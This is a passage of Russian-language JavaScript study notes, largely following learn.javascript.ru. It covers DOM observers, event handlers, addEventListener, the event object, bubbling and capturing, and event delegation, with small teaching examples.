shadowRoot.innerHTML = `<style>div { color: red; }</style><div>Текст</div>`;
```

###### MutationObserver

API для отслеживания изменений DOM:
```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    console.log('Изменения в:', mutation.target);
  });
});

observer.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true
});
```

###### Intersection Observer

Эффективное отслеживание видимости элементов:
```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      console.log('Элемент появился в viewport');
    }
  });
});

observer.observe(document.querySelector('.target'));
```

###### Заключение

DOM - это сложная и высокооптимизированная система, которая:
1. Преобразует статический HTML в динамическую объектную модель
2. Обеспечивает программный интерфейс для управления документом
3. Постоянно эволюционирует для удовлетворения потребностей современных веб-приложений

Понимание внутренних механизмов DOM позволяет писать более эффективный код и лучше оптимизировать веб-приложения.
##### события

https://learn.javascript.ru/introduction-browser-events
https://developer.mozilla.org/ru/docs/Web/Events
https://doka.guide/js/events/


*Событие* - это сигнал от браузера о том, что что-то произошло. Все DOM-узлы подают такие сигналы (хотя события бывают и не только в DOM).

Вот список самых часто используемых DOM-событий, пока просто для ознакомления:

**События мыши:**
- `click` -- происходит, когда кликнули на элемент левой кнопкой мыши (на устройствах с сенсорными экранами оно происходит при касании).
- `contextmenu` -- происходит, когда кликнули на элемент правой кнопкой мыши.
- `mouseover` / `mouseout` -- когда мышь наводится на / покидает элемент.
- `mousedown` / `mouseup` -- когда нажали / отжали кнопку мыши на элементе.
- `mousemove` -- при движении мыши.

**События на элементах управления:**
- `submit` -- пользователь отправил форму `<form>`.
- `focus` -- пользователь фокусируется на элементе, например нажимает на `<input>`.

**Клавиатурные события:**
- `keydown` и `keyup` -- когда пользователь нажимает / отпускает клавишу.

**События документа:**
- `DOMContentLoaded` -- когда HTML загружен и обработан, DOM документа полностью построен и доступен.

**CSS events:**
- `transitionend` -- когда CSS-анимация завершена.

Существует множество других событий. Мы подробно разберём их в последующих главах.

###### Обработчики событий

Событию можно назначить *обработчик*, то есть функцию, которая сработает, как только событие произошло.

Именно благодаря обработчикам JavaScript-код может реагировать на действия пользователя.

Есть несколько способов назначить событию обработчик. Сейчас мы их рассмотрим, начиная с самого простого.

###### Использование атрибута HTML

Обработчик может быть назначен прямо в разметке, в атрибуте, который называется `on<событие>`.

Например, чтобы назначить обработчик события `click` на элементе `input`, можно использовать атрибут `onclick`, вот так:

```html run
<input value="Нажми меня" *!*onclick="alert('Клик!')"*/!* type="button">
```

При клике мышкой на кнопке выполнится код, указанный в атрибуте `onclick`.

Обратите внимание, для содержимого атрибута `onclick` используются одинарные кавычки, так как сам атрибут находится в двойных. Если мы забудем об этом и поставим двойные кавычки внутри атрибута, вот так: `onclick="alert("Click!")"`, код не будет работать.

Атрибут HTML-тега - не самое удобное место для написания большого количества кода, поэтому лучше создать отдельную JavaScript-функцию и вызвать её там.

Следующий пример по клику запускает функцию `countRabbits()`:

```html autorun height=50
<script>
  function countRabbits() {
    for(let i=1; i<=3; i++) {
      alert("Кролик номер " + i);
    }
  }
</script>

<input type="button" *!*onclick="countRabbits()"*/!* value="Считать кроликов!">
```

Как мы помним, атрибут HTML-тега не чувствителен к регистру, поэтому `ONCLICK` будет работать так же, как `onClick` и `onCLICK`... Но, как правило, атрибуты пишут в нижнем регистре: `onclick`.

###### Использование свойства DOM-объекта

Можно назначать обработчик, используя свойство DOM-элемента `on<событие>`.

К примеру, `elem.onclick`:

```html autorun
<input id="elem" type="button" value="Нажми меня!">
<script>
*!*
  elem.onclick = function() {
    alert('Спасибо');
  };
*/!*
</script>
```

Если обработчик задан через атрибут, то браузер читает HTML-разметку, создаёт новую функцию из содержимого атрибута и записывает в свойство.

Этот способ, по сути, аналогичен предыдущему.

**Обработчик всегда хранится в свойстве DOM-объекта, а атрибут – лишь один из способов его инициализации.**

Эти два примера кода работают одинаково:

1. Только HTML:

    ```html autorun height=50
    <input type="button" *!*onclick="alert('Клик!')"*/!* value="Кнопка">
    ```
2. HTML + JS:

    ```html autorun height=50
    <input type="button" id="button" value="Кнопка">
    <script>
    *!*
      button.onclick = function() {
        alert('Клик!');
      };
    */!*
    </script>
    ```

**Так как у элемента DOM может быть только одно свойство с именем `onclick`, то назначить более одного обработчика так нельзя.**

В примере ниже назначение через JavaScript перезапишет обработчик из атрибута:

```html run height=50 autorun
<input type="button" id="elem" onclick="alert('Было')" value="Нажми меня">
<script>
*!*
  elem.onclick = function() { // перезапишет существующий обработчик
    alert('Станет'); // выведется только это
  };
*/!*
</script>
```

Кстати, обработчиком можно назначить и уже существующую функцию:

```js
function sayThanks() {
  alert('Спасибо!');
}

elem.onclick = sayThanks;
```

Убрать обработчик можно назначением `elem.onclick = null`.

###### Доступ к элементу через this

Внутри обработчика события `this` ссылается на текущий элемент, то есть на тот, на котором, как говорят, "висит" (т.е. назначен) обработчик.

В коде ниже `button` выводит своё содержимое, используя `this.innerHTML`:

```html height=50 autorun
<button onclick="alert(this.innerHTML)">Нажми меня</button>
```

###### Частые ошибки

Если вы только начинаете работать с событиями, обратите внимание на следующие моменты.

**Функция должна быть присвоена как `sayThanks`, а не `sayThanks()`.**

```js
// правильно
button.onclick = sayThanks;

// неправильно
button.onclick = sayThanks();
```

Если добавить скобки, то `sayThanks()` -- это уже вызов функции, результат которого (равный `undefined`, так как функция ничего не возвращает) будет присвоен `onclick`. Так что это не будет работать.

...А вот в разметке, в отличие от свойства, скобки нужны:

```html
<input type="button" id="button" onclick="sayThanks()">
```

Это различие просто объяснить. При создании обработчика браузером из атрибута, он автоматически создаёт функцию с *телом из значения атрибута*: `sayThanks()`.

Так что разметка генерирует такое свойство:
```js
button.onclick = function() {
*!*
  sayThanks(); // содержимое атрибута
*/!*
};
```

**Используйте именно функции, а не строки.**

Назначение обработчика строкой `elem.onclick = "alert(1)"` также сработает. Это сделано из соображений совместимости, но делать так не рекомендуется.

**Не используйте `setAttribute` для обработчиков.**

Такой вызов работать не будет:

```js run no-beautify
// при нажатии на body будут ошибки,
// атрибуты всегда строки, и функция станет строкой
document.body.setAttribute('onclick', function() { alert(1) });
```

**Регистр DOM-свойства имеет значение.**

Используйте `elem.onclick`, а не `elem.ONCLICK`, потому что DOM-свойства чувствительны к регистру.

###### addEventListener

Фундаментальный недостаток описанных выше способов назначения обработчика – невозможность повесить несколько обработчиков на одно событие.

Например, одна часть кода хочет при клике на кнопку делать её подсвеченной, а другая – выдавать сообщение.

Мы хотим назначить два обработчика для этого. Но новое DOM-свойство перезапишет предыдущее:

```js no-beautify
input.onclick = function() { alert(1); }
// ...
input.onclick = function() { alert(2); } // заменит предыдущий обработчик
```

Разработчики стандартов достаточно давно это поняли и предложили альтернативный способ назначения обработчиков при помощи специальных методов `addEventListener` и `removeEventListener`. Они свободны от указанного недостатка.

Синтаксис добавления обработчика:

```js
element.addEventListener(event, handler, [options]);
```

`event`
: Имя события, например `"click"`.

`handler`
: Ссылка на функцию-обработчик.

`options`
: Дополнительный объект со свойствами:
    - `once`: если `true`, тогда обработчик будет автоматически удалён после выполнения.
    - `capture`: фаза, на которой должен сработать обработчик, подробнее об этом будет рассказано в главе <info:bubbling-and-capturing>. Так исторически сложилось, что `options` может быть `false/true`, это то же самое, что `{capture: false/true}`.
    - `passive`: если `true`, то указывает, что обработчик никогда не вызовет `preventDefault()`, подробнее об этом будет рассказано в главе <info:default-browser-action>.


Для удаления обработчика следует использовать `removeEventListener`:

```js
element.removeEventListener(event, handler, [options]);
```

````warn header="Удаление требует именно ту же функцию"
Для удаления нужно передать именно ту функцию-обработчик которая была назначена.

Вот так не сработает:

```js no-beautify
elem.addEventListener( "click" , () => alert('Спасибо!'));
// ....
elem.removeEventListener( "click", () => alert('Спасибо!'));
```

Обработчик не будет удалён, т.к. в `removeEventListener` передана не та же функция, а другая, с одинаковым кодом, но это не важно.

Вот так правильно:

```js
function handler() {
  alert( 'Спасибо!' );
}

input.addEventListener("click", handler);
// ....
input.removeEventListener("click", handler);
```

Обратим внимание -- если функцию обработчик не сохранить где-либо, мы не сможем её удалить. Нет метода, который позволяет получить из элемента обработчики событий, назначенные через `addEventListener`.
````

Метод `addEventListener` позволяет добавлять несколько обработчиков на одно событие одного элемента, например:

```html run no-beautify
<input id="elem" type="button" value="Нажми меня"/>

<script>
  function handler1() {
    alert('Спасибо!');
  };

  function handler2() {
    alert('Спасибо ещё раз!');
  }

*!*
  elem.onclick = () => alert("Привет");
  elem.addEventListener("click", handler1); // Спасибо!
  elem.addEventListener("click", handler2); // Спасибо ещё раз!
*/!*
</script>
```

Как видно из примера выше, можно одновременно назначать обработчики и через DOM-свойство и через `addEventListener`. Однако, во избежание путаницы, рекомендуется выбрать один способ.

````warn header="Обработчики некоторых событий можно назначать только через `addEventListener`"
Существуют события, которые нельзя назначить через DOM-свойство, но можно через `addEventListener`.

Например, таково событие `DOMContentLoaded`, которое срабатывает, когда завершена загрузка и построение DOM документа.

```js
document.onDOMContentLoaded = function() {
  alert("DOM построен"); // не будет работать
};
```

```js
document.addEventListener("DOMContentLoaded", function() {
  alert("DOM построен"); // а вот так сработает
});
```
Так что `addEventListener` более универсален. Хотя заметим, что таких событий меньшинство, это скорее исключение, чем правило.
````

## Объект события

Чтобы хорошо обработать событие, могут понадобиться детали того, что произошло. Не просто "клик" или "нажатие клавиши", а также -- какие координаты указателя мыши, какая клавиша нажата и так далее.

Когда происходит событие,  браузер создаёт *объект события*, записывает в него детали и передаёт его в качестве аргумента функции-обработчику.

Пример ниже демонстрирует получение координат мыши из объекта события:

```html run
<input type="button" value="Нажми меня" id="elem">

<script>
  elem.onclick = function(*!*event*/!*) {
    // вывести тип события, элемент и координаты клика
    alert(event.type + " на " + event.currentTarget);
    alert("Координаты: " + event.clientX + ":" + event.clientY);
  };
</script>
```

Некоторые свойства объекта `event`:

`event.type`
: Тип события, в данном случае `"click"`.

`event.currentTarget`
: Элемент, на котором сработал обработчик. Значение -- обычно такое же, как и у `this`, но если обработчик является функцией-стрелкой или при помощи `bind` привязан другой объект в качестве `this`, то мы можем получить элемент из `event.currentTarget`.

`event.clientX / event.clientY`
: Координаты курсора в момент клика относительно окна, для событий мыши.

Есть также и ряд других свойств, в зависимости от типа событий, которые мы разберём в дальнейших главах.

````smart header="Объект события доступен и в HTML"
При назначении обработчика в HTML, тоже можно использовать объект `event`, вот так:

```html autorun height=60
<input type="button" onclick="*!*alert(event.type)*/!*" value="Тип события">
```

Это возможно потому, что когда браузер из атрибута создаёт функцию-обработчик, то она выглядит так: `function(event) { alert(event.type) }`. То есть, её первый аргумент называется `"event"`, а тело взято из атрибута.
````


###### Объект-обработчик: handleEvent

Мы можем назначить обработчиком не только функцию, но и объект при помощи `addEventListener`. В этом случае, когда происходит событие, вызывается метод объекта `handleEvent`.

К примеру:


```html run
<button id="elem">Нажми меня</button>

<script>
  elem.addEventListener('click', {
    handleEvent(event) {
      alert(event.type + " на " + event.currentTarget);
    }
  });
</script>
```

Как видим, если `addEventListener` получает объект в качестве обработчика, он вызывает `object.handleEvent(event)`, когда происходит событие.

Мы также можем использовать класс для этого:


```html run
<button id="elem">Нажми меня</button>

<script>
  class Menu {
    handleEvent(event) {
      switch(event.type) {
        case 'mousedown':
          elem.innerHTML = "Нажата кнопка мыши";
          break;
        case 'mouseup':
          elem.innerHTML += "...и отжата.";
          break;
      }
    }
  }

*!*
  let menu = new Menu();
  elem.addEventListener('mousedown', menu);
  elem.addEventListener('mouseup', menu);
*/!*
</script>
```

Здесь один и тот же объект обрабатывает оба события. Обратите внимание, мы должны явно назначить оба обработчика через `addEventListener`. Тогда объект `menu` будет получать события `mousedown` и `mouseup`, но не другие (не назначенные) типы событий.

Метод `handleEvent` не обязательно должен выполнять всю работу сам. Он может вызывать другие методы, которые заточены под обработку конкретных типов событий, вот так:

```html run
<button id="elem">Нажми меня</button>

<script>
  class Menu {
    handleEvent(event) {
      // mousedown -> onMousedown
      let method = 'on' + event.type[0].toUpperCase() + event.type.slice(1);
      this[method]();
    }

    onMousedown() {
      elem.innerHTML = "Кнопка мыши нажата";
    }

    onMouseup() {
      elem.innerHTML += "...и отжата.";
    }
  }

  let menu = new Menu();
  elem.addEventListener('mousedown', menu);
  elem.addEventListener('mouseup', menu);
</script>
```

Теперь обработка событий разделена по методам, что упрощает поддержку кода.

###### Итого

Есть три способа назначения обработчиков событий:

1. Атрибут HTML: `onclick="..."`.
2. DOM-свойство: `elem.onclick = function`.
3. Специальные методы: `elem.addEventListener(event, handler[, phase])` для добавления, `removeEventListener` для удаления.

HTML-атрибуты используются редко потому, что JavaScript в HTML-теге выглядит немного странно. К тому же много кода там не напишешь.

DOM-свойства вполне можно использовать, но мы не можем назначить больше одного обработчика на один тип события. Во многих случаях с этим ограничением можно мириться.

Последний способ самый гибкий, однако нужно писать больше всего кода. Есть несколько типов событий, которые работают только через него, например, `DOMContentLoaded`. Также `addEventListener` поддерживает объекты в качестве обработчиков событий. В этом случае вызывается метод объекта `handleEvent`.

Не важно, как вы назначаете обработчик -- он получает объект события первым аргументом. Этот объект содержит подробности о том, что произошло.

Мы изучим больше о событиях и их типах в следующих главах.

##### всплытие/погружение

Давайте начнём с примера.

Этот обработчик для `<div>` сработает, если вы кликните по любому из вложенных тегов, будь то `<em>` или `<code>`:

```html autorun height=60
<div onclick="alert('Обработчик!')">
  <em>Если вы кликните на <code>EM</code>, сработает обработчик на <code>DIV</code></em>
</div>
```

Вам не кажется это странным? Почему же сработал обработчик на `<div>`, если клик произошёл на `<em>`?

###### Всплытие

Принцип всплытия очень простой.

**Когда на элементе происходит событие, обработчики сначала срабатывают на нём, потом на его родителе, затем выше и так далее, вверх по цепочке предков.**

Например, есть 3 вложенных элемента `FORM > DIV > P` с обработчиком на каждом:

```html run autorun
<style>
  body * {
    margin: 10px;
    border: 1px solid blue;
  }
</style>

<form onclick="alert('form')">FORM
  <div onclick="alert('div')">DIV
    <p onclick="alert('p')">P</p>
  </div>
</form>
```

Клик по внутреннему `<p>` вызовет обработчик `onclick`:
1. Сначала на самом `<p>`.
2. Потом на внешнем `<div>`.
3. Затем на внешнем `<form>`.
4. И так далее вверх по цепочке до самого `document`.

![](event-order-bubbling.svg)

Поэтому если кликнуть на `<p>`, то мы увидим три оповещения: `p` -> `div` -> `form`.

Этот процесс называется "всплытием", потому что события "всплывают" от внутреннего элемента вверх через родителей подобно тому, как всплывает пузырёк воздуха в воде.

```warn header="*Почти* все события всплывают."
Ключевое слово в этой фразе -- "почти".

Например, событие `focus` не всплывает. В дальнейшем мы увидим и другие примеры. Однако, стоит понимать, что это скорее исключение, чем правило, всё-таки большинство событий всплывают.
```

###### event.target

Всегда можно узнать, на каком конкретно элементе произошло событие.

**Самый глубокий элемент, который вызывает событие, называется *целевым* элементом, и он доступен через `event.target`.**

Отличия от `this` (=`event.currentTarget`):

- `event.target` -- это "целевой" элемент, на котором произошло событие, в процессе всплытия он неизменен.
- `this` -- это "текущий" элемент, до которого дошло всплытие, на нём сейчас выполняется обработчик.

Например, если стоит только один обработчик `form.onclick`, то он "поймает" все клики внутри формы. Где бы ни был клик внутри -- он всплывёт до элемента `<form>`, на котором сработает обработчик.

При этом внутри обработчика `form.onclick`:

- `this` (=`event.currentTarget`) всегда будет элемент `<form>`, так как обработчик сработал на ней.
- `event.target` будет содержать ссылку на конкретный элемент внутри формы, на котором произошёл клик.

Попробуйте сами:

[codetabs height=220 src="bubble-target"]

Возможна и ситуация, когда `event.target` и `this` -- один и тот же элемент, например, если клик был непосредственно на самом элементе `<form>`, а не на его подэлементе.

###### Прекращение всплытия

Всплытие идёт с "целевого" элемента прямо наверх. По умолчанию событие будет всплывать до элемента `<html>`, а затем до объекта `document`, а иногда даже до `window`, вызывая все обработчики на своём пути.

Но любой промежуточный обработчик может решить, что событие полностью обработано, и остановить всплытие.

Для этого нужно вызвать метод `event.stopPropagation()`.

Например, здесь при клике на кнопку `<button>` обработчик `body.onclick` не сработает:

```html run autorun height=60
<body onclick="alert(`сюда всплытие не дойдёт`)">
  <button onclick="event.stopPropagation()">Кликни меня</button>
</body>
```

```smart header="event.stopImmediatePropagation()"
Если у элемента есть несколько обработчиков на одно событие, то даже при прекращении всплытия все они будут выполнены.

То есть, `event.stopPropagation()` препятствует продвижению события дальше, но на текущем элементе все обработчики будут вызваны.

Для того, чтобы полностью остановить обработку, существует метод `event.stopImmediatePropagation()`. Он не только предотвращает всплытие, но и останавливает обработку событий на текущем элементе.
```

```warn header="Не прекращайте всплытие без необходимости!"
Всплытие -- это удобно. Не прекращайте его без явной нужды, очевидной и архитектурно прозрачной.

Зачастую прекращение всплытия через `event.stopPropagation()` имеет свои подводные камни, которые со временем могут стать проблемами.

Например:

1. Мы делаем вложенное меню.  Каждое подменю обрабатывает клики на своих элементах и делает для них `stopPropagation`, чтобы не срабатывало внешнее меню.
2. Позже мы решили отслеживать все клики в окне для какой-то своей функциональности, к примеру, для статистики – где вообще у нас кликают люди. Некоторые системы аналитики так делают. Обычно используют `document.addEventListener('click'…)`, чтобы отлавливать все клики.
3. Наша аналитика не будет работать над областью, где клики прекращаются `stopPropagation`. Увы, получилась "мёртвая зона".

Зачастую нет никакой необходимости прекращать всплытие. Задача, которая, казалось бы, требует этого, может быть решена иначе. Например, с помощью создания своего уникального события, о том, как это делать, мы поговорим позже. Также мы можем записывать какую-то служебную информацию в объект `event` в одном обработчике, а читать в другом, таким образом мы можем сообщить обработчикам на родительских элементах информацию о том, что событие уже было как-то обработано.
```


###### Погружение

Существует ещё одна фаза из жизненного цикла события -- "погружение" (иногда её называют "перехват"). Она очень редко используется в реальном коде, однако тоже может быть полезной.

Стандарт [DOM Events](https://www.w3.org/TR/DOM-Level-3-Events/) описывает 3 фазы прохода события:

1. Фаза погружения (capturing phase) -- событие сначала идёт сверху вниз.
2. Фаза цели (target phase) -- событие достигло целевого(исходного) элемента.
3. Фаза всплытия (bubbling stage) -- событие начинает всплывать.

Картинка из спецификации демонстрирует, как это работает при клике по ячейке `<td>`, расположенной внутри таблицы:

![](eventflow.svg)

То есть при клике на `<td>` событие путешествует по цепочке родителей сначала вниз к элементу (погружается), затем оно достигает целевой элемент (фаза цели), а потом идёт наверх (всплытие), вызывая по пути обработчики.

**Ранее мы говорили только о всплытии, потому что другие стадии, как правило, не используются и проходят незаметно для нас.**

Обработчики, добавленные через `on<event>`-свойство или через HTML-атрибуты, или через `addEventListener(event, handler)` с двумя аргументами, ничего не знают о фазе погружения, а работают только на 2-ой и 3-ей фазах.

Чтобы поймать событие на стадии погружения, нужно использовать третий аргумент `capture` вот так:

```js
elem.addEventListener(..., {capture: true})
// или просто "true", как сокращение для {capture: true}
elem.addEventListener(..., true)
```

Существуют два варианта значений опции `capture`:

- Если аргумент `false` (по умолчанию), то событие будет поймано при всплытии.
- Если аргумент `true`, то событие будет перехвачено при погружении.

Обратите внимание, что хоть и формально существует 3 фазы, 2-ую фазу ("фазу цели": событие достигло элемента) нельзя обработать отдельно, при её достижении вызываются все обработчики: и на всплытие, и на погружение.

Давайте посмотрим и всплытие и погружение в действии:

```html run autorun height=140 edit
<style>
  body * {
    margin: 10px;
    border: 1px solid blue;
  }
</style>

<form>FORM
  <div>DIV
    <p>P</p>
  </div>
</form>

<script>
  for(let elem of document.querySelectorAll('*')) {
    elem.addEventListener("click", e => alert(`Погружение: ${elem.tagName}`), true);
    elem.addEventListener("click", e => alert(`Всплытие: ${elem.tagName}`));
  }
</script>
```

Здесь обработчики навешиваются на *каждый* элемент в документе, чтобы увидеть в каком порядке они вызываются по мере прохода события.

Если вы кликните по `<p>`, то последовательность следующая:

1. `HTML` -> `BODY` -> `FORM` -> `DIV` (фаза погружения, первый обработчик)
2. `P` (фаза цели, срабатывают обработчики, установленные и на погружение и на всплытие, так что выведется два раза)
3. `DIV` -> `FORM` -> `BODY` -> `HTML` (фаза всплытия, второй обработчик)

Существует свойство `event.eventPhase`, содержащее номер фазы, на которой событие было поймано. Но оно используется редко, мы обычно и так знаем об этом в обработчике.

```smart header="Чтобы убрать обработчик `removeEventListener`, нужна та же фаза"
Если мы добавили обработчик вот так `addEventListener(..., true)`, то мы должны передать то же значение аргумента `capture` в `removeEventListener(..., true)`, когда снимаем обработчик.


````smart header="На каждой фазе разные обработчики на одном элементе срабатывают в порядке назначения"
Если у нас несколько обработчиков одного события, назначенных `addEventListener` на один элемент, в рамках одной фазы, то их порядок срабатывания - тот же, в котором они установлены:

```js
elem.addEventListener("click", e => alert(1)); // всегда сработает перед следующим
elem.addEventListener("click", e => alert(2));
```
````

###### Итого

При наступлении события - самый глубоко вложенный элемент, на котором оно произошло, помечается как "целевой" (`event.target`).

- Затем событие сначала двигается вниз от корня документа к `event.target`, по пути вызывая обработчики, поставленные через `addEventListener(...., true)`, где `true` -- это сокращение для `{capture: true}`.
- Далее обработчики вызываются на целевом элементе.
- Далее событие двигается от `event.target` вверх к корню документа, по пути вызывая обработчики, поставленные через `on<event>` и `addEventListener` без третьего аргумента или с третьим аргументом равным `false`.

Каждый обработчик имеет доступ к свойствам события `event`:

- `event.target` -- самый глубокий элемент, на котором произошло событие.
- `event.currentTarget` (=`this`) -- элемент, на котором в данный момент сработал обработчик (тот, на котором "висит" конкретный обработчик)
- `event.eventPhase` -- на какой фазе он сработал (погружение=1, фаза цели=2, всплытие=3).

Любой обработчик может остановить событие вызовом `event.stopPropagation()`, но делать это не рекомендуется, так как в дальнейшем это событие может понадобиться, иногда для самых неожиданных вещей.

В современной разработке стадия погружения используется очень редко, обычно события обрабатываются во время всплытия. И в этом есть логика.

В реальном мире, когда происходит чрезвычайная ситуация, местные службы реагируют первыми. Они знают лучше всех местность, в которой это произошло, и другие детали. Вышестоящие инстанции подключаются уже после этого и при необходимости.

Тоже самое справедливо для обработчиков событий. Код, который "навесил" обработчик на конкретный элемент, знает максимум деталей об элементе и его предназначении. Например, обработчик на определённом `<td>` скорее всего подходит только для этого конкретного `<td>`, он знает все о нём, поэтому он должен отработать первым. Далее имеет смысл передать обработку события родителю -- он тоже понимает, что происходит, но уже менее детально, далее – выше, и так далее, до самого объекта `document`, обработчик на котором реализовывает самую общую функциональность уровня документа.

Всплытие и погружение являются основой для "делегирования событий" -- очень мощного приёма обработки событий. Его мы изучим в следующей главе.

##### делегирование событий

Всплытие и перехват событий позволяет реализовать один из самых важных приёмов разработки -- *делегирование*.

Идея в том, что если у нас есть много элементов, события на которых нужно обрабатывать похожим образом, то вместо того, чтобы назначать обработчик каждому, мы ставим один обработчик на их общего предка.

Из него можно получить целевой элемент `event.target`, понять на каком именно потомке произошло событие и обработать его.

Рассмотрим пример -- [диаграмму Ба-Гуа](https://ru.wikipedia.org/wiki/%D0%92%D0%BE%D1%81%D0%B5%D0%BC%D1%8C_%D1%82%D1%80%D0%B8%D0%B3%D1%80%D0%B0%D0%BC%D0%BC). Это таблица, отражающая древнюю китайскую философию.

Вот она:

[iframe height=350 src="bagua" edit link]

Её HTML (схематично):

```html
<table>
  <tr>
    <th colspan="3">Квадрат <em>Bagua</em>: Направление, Элемент, Цвет, Значение</th>
  </tr>
  <tr>
    <td>...<strong>Северо-Запад</strong>...</td>
    <td>...</td>
    <td>...</td>
  </tr>
  <tr>...ещё 2 строки такого же вида...</tr>
  <tr>...ещё 2 строки такого же вида...</tr>
</table>
```

В этой таблице всего 9 ячеек, но могло бы быть и 99, и даже 9999, не важно.

**Наша задача - реализовать подсветку ячейки `<td>` при клике.**

Вместо того, чтобы назначать обработчик `onclick` для каждой ячейки `<td>` (их может быть очень много) -- мы повесим "единый" обработчик на элемент `<table>`.

Он будет использовать `event.target`, чтобы получить элемент, на котором произошло событие, и подсветить его.

Код будет таким:

```js
let selectedTd;

*!*
table.onclick = function(event) {
  let target = event.target; // где был клик?

  if (target.tagName != 'TD') return; // не на TD? тогда не интересует

  highlight(target); // подсветить TD
};
*/!*

function highlight(td) {
  if (selectedTd) { // убрать существующую подсветку, если есть
    selectedTd.classList.remove('highlight');
  }
  selectedTd = td;
  selectedTd.classList.add('highlight'); // подсветить новый td
}
```

Такому коду нет разницы, сколько ячеек в таблице. Мы можем добавлять, удалять `<td>` из таблицы динамически в любое время, и подсветка будет стабильно работать.

Однако, у текущей версии кода есть недостаток.

Клик может быть не на теге `<td>`, а внутри него.

В нашем случае, если взглянуть на HTML-код таблицы внимательно, видно, что ячейка `<td>` содержит вложенные теги, например `<strong>`:

```html
<td>
*!*
  <strong>Северо-Запад</strong>
*/!*
  ...
</td>
```

Естественно, если клик произойдёт на элементе `<strong>`, то он станет значением `event.target`.

![](bagua-bubble.svg)

Внутри обработчика `table.onclick` мы должны по `event.target` разобраться, был клик внутри `<td>` или нет.

Вот улучшенный код:

```js
table.onclick = function(event) {
  let td = event.target.closest('td'); // (1)

  if (!td) return; // (2)

  if (!table.contains(td)) return; // (3)

  highlight(td); // (4)
};
```

Разберём пример:
1. Метод `elem.closest(selector)` возвращает ближайшего предка, соответствующего селектору. В данном случае нам нужен `<td>`, находящийся выше по дереву от исходного элемента.
2. Если `event.target` не содержится внутри элемента `<td>`, то вызов вернёт `null`, и ничего не произойдёт.
3. Если таблицы вложенные, `event.target` может содержать элемент `<td>`, находящийся вне текущей таблицы. В таких случаях мы должны проверить, действительно ли это `<td>` *нашей таблицы*.
4. И если это так, то подсвечиваем его.

В итоге мы получили короткий код подсветки, быстрый и эффективный, которому совершенно не важно, сколько всего в таблице `<td>`.

###### Применение делегирования: действия в разметке

Есть и другие применения делегирования.

Например, нам нужно сделать меню с разными кнопками: "Сохранить (save)", "Загрузить (load)", "Поиск (search)" и т.д. И есть объект с соответствующими методами `save`, `load`, `search`... Как их состыковать?

Первое, что может прийти в голову – это найти каждую кнопку и назначить ей свой обработчик среди методов объекта. Но существует более элегантное решение. Мы можем добавить один обработчик для всего меню и атрибуты `data-action` для каждой кнопки в соответствии с методами, которые они вызывают:

```html
<button *!*data-action="save"*/!*>Нажмите, чтобы Сохранить</button>
```

Обработчик считывает содержимое атрибута и выполняет метод. Взгляните на рабочий пример:

```html autorun height=60 run untrusted
<div id="menu">
  <button data-action="save">Сохранить</button>
  <button data-action="load">Загрузить</button>
  <button data-action="search">Поиск</button>
</div>

<script>
  class Menu {
    constructor(elem) {
      elem.onclick = this.onClick.bind(this); // (*)
    }

    save() {
      alert('сохраняю');
    }

    load() {
      alert('загружаю');
    }

    search() {
      alert('ищу');
    }

    onClick(event) {
*!*
      let action = event.target.dataset.action;
      if (action) {
        this[action]();
      }
*/!*
    }
  }

  new Menu(menu);
</script>
```

Обратите внимание, что метод `this.onClick` в строке, отмеченной звёздочкой `(*)`, привязывается к контексту текущего объекта `this`. Это важно, т.к. иначе `this` внутри него будет ссылаться на DOM-элемент (`elem`), а не на объект `Menu`, и `this[action]` будет не тем, что нам нужно.

Так что же даёт нам здесь делегирование?

```compare
+ Не нужно писать код, чтобы присвоить обработчик каждой кнопке. Достаточно просто создать один метод и поместить его в разметку.
+ Структура HTML становится по-настоящему гибкой. Мы можем добавлять/удалять кнопки в любое время.
```

Мы также можем использовать классы `.action-save`, `.action-load`, но подход с использованием атрибутов `data-action` является более семантичным. Их можно использовать и для стилизации в правилах CSS.

###### Приём проектирования "поведение"

Делегирование событий можно использовать для добавления элементам "поведения" (behavior), *декларативно* задавая хитрые обработчики установкой специальных HTML-атрибутов и классов.

Приём проектирования "поведение" состоит из двух частей:
1. Элементу ставится пользовательский атрибут, описывающий его поведение.
2. При помощи делегирования ставится обработчик на документ, который ловит все клики (или другие события) и, если элемент имеет нужный атрибут, производит соответствующее действие.

###### Поведение: "Счётчик"

Например, здесь HTML-атрибут `data-counter` добавляет кнопкам поведение: "увеличить значение при клике":

```html run autorun height=60
Счётчик: <input type="button" value="1" data-counter>
Ещё счётчик: <input type="button" value="2" data-counter>

<script>
  document.addEventListener('click', function(event) {

    if (event.target.dataset.counter != undefined) { // если есть атрибут...
      event.target.value++;
    }

  });
</script>
```

Если нажать на кнопку -- значение увеличится. Конечно, нам важны не счётчики, а общий подход, который здесь продемонстрирован.

Элементов с атрибутом `data-counter` может быть сколько угодно. Новые могут добавляться в HTML-код в любой момент. При помощи делегирования мы фактически добавили новый "псевдостандартный" атрибут в HTML, который добавляет элементу новую возможность ("поведение").

```warn header="Всегда используйте метод `addEventListener` для обработчиков на уровне документа"
Когда мы устанавливаем обработчик событий на объект `document`, мы всегда должны использовать метод `addEventListener`, а не `document.on<событие>`, т.к. в случае последнего могут возникать конфликты: новые обработчики будут перезаписывать уже существующие.

Для реального проекта совершенно нормально иметь много обработчиков на элементе `document`, установленных из разных частей кода.
```

### Поведение: "Переключатель" (Toggler)

Ещё один пример поведения. Сделаем так, что при клике на элемент с атрибутом `data-toggle-id` будет скрываться/показываться элемент с заданным `id`:

```html autorun run height=60
<button *!*data-toggle-id="subscribe-mail"*/!*>
  Показать форму подписки
</button>

<form id="subscribe-mail" hidden>
  Ваша почта: <input type="email">
</form>

<script>
*!*
  document.addEventListener('click', function(event) {
    let id = event.target.dataset.toggleId;
    if (!id) return;

    let elem = document.getElementById(id);

    elem.hidden = !elem.hidden;
  });
*/!*
</script>
```

Ещё раз подчеркнём, что мы сделали. Теперь для того, чтобы добавить скрытие-раскрытие любому элементу, даже не надо знать JavaScript, можно просто написать атрибут `data-toggle-id`.

Это бывает очень удобно -- не нужно писать JavaScript-код для каждого элемента, который должен так себя вести. Просто используем поведение. Обработчики на уровне документа сделают это возможным для элемента в любом месте страницы.

Мы можем комбинировать несколько вариантов поведения на одном элементе.

Шаблон "поведение" может служить альтернативой для фрагментов JS-кода в вёрстке.

###### Итого

Делегирование событий -- это здорово! Пожалуй, это один из самых полезных приёмов для работы с DOM.

Он часто используется, если есть много элементов, обработка которых очень схожа, но не только для этого.

